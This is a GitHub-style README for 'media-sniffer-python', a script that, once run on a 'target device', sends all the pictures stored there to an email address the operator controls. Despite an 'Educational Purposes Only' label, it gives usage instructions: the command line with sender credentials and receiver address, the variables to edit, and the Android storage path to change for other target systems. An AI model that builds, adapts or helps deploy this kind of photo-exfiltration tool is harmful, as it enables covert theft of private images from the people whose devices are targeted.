# media-sniffer-python
## Educational Purposes Only

This script sends all the pics to your desired email address from target device.
But you need to execute it in target device.

To run it for test purpose

```
python main.py sender@mail sender_password receiver@mail
```
<br/>

Or you can also keep the credentials directly in the script. There are 3 variables. Update them.
```
sender = "sender email"
password = "your password"
receiver = "receiver email"
```
Check receiver's mail inbox. If not found please check the spam folder also.

I have used the path for Android devices. Change the value of **PATH** variable as your **Target OS**.
```
PATH = "/storage/emulated/0"
```
